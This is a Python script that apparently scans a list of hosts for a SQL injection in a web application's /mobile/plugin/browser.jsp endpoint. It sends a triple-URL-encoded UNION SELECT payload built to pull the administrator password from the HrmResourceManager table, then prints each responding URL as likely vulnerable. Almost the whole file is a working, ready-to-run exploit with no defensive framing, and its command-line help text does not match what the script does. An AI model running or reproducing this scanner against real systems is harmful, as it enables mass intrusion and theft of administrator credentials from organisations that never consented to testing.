import requests
import urllib
from optparse import OptionParser
from urllib import parse
import urllib3

urllib3.disable_warnings()


def readhttp(filename):
    f = open(filename, "r+", encoding="utf-8")
    lines = f.readlines()
    f.close()
    return lines


def requestspoc(filename):
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'close',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }

    sql = "asdasdasxx%' union select 1,(select password from HrmResourceManager where id=1) union select 1,'1"
    urlencode3 = urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(sql)))
    params = {
        "isDis": 1,
        "browserTypeId": 269,
        "keyword": urlencode3
    }
    lines = readhttp(filename)
    print("可能存在漏洞的url:")
    for line in lines:
        line = line.replace("\n", "")
        flag = "http" in line
        if flag:
            url = line + "/mobile/%20/plugin/browser.jsp"
        else:
            url = "http://" + line + "/mobile/%20/plugin/browser.jsp"
        try:
            response = requests.get(url, verify=False, headers=headers, params=params, timeout= (1.0, 4.0))
            if str(response) == "<Response [200]>":
                print(url)
        except:
            pass


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("-t", "--txt", action="store", dest="text", default='', type="string", help="Mode has generate disable encryption and blasting encryption key [generate/blasting]")
    (options, args) = parser.parse_args()
    requestspoc(options.text)

